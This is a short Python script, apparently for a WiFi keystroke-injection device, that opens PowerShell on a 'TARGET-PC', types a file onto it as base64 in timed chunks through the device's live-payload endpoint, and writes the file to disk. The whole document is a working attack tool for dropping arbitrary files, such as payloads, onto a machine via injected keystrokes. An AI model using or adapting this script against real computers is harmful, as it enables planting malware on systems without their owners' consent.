import requests
import base64
import time

chunk_size = 1500
delay = 8

file = input("FILE TO UPLOAD> ")
output_path = input("PATH ON TARGET-PC> ")

with open(file, "rb") as f:
    data = f.read()
    b64 = base64.b64encode(data).decode("UTF-8")

# Split into Base64 encoded string into chunks 
chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

# Empty variable
url = "http://192.168.1.1"

# Open Powershell
requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
time.sleep(delay)

# Initialize variable
res = requests.post(f"{url}/runlivepayload", data={"livepayload": 'PrintLine: $b64str=""', "livepayloadpresent": "1"})
time.sleep(delay)

# Send file
for i in range(len(chunks)):
    print(f"Sending chunk {i+1} / {len(chunks)} ", end ="")

    res = requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: $b64str+="{chunks[i]}"', "livepayloadpresent": "1"})

    print("... DONE")
    time.sleep(delay)

# Write file to disk
res = requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: [IO.File]::WriteAllBytes("{output_path}", [Convert]::FromBase64String($b64str)); exit;', "livepayloadpresent": "1"})
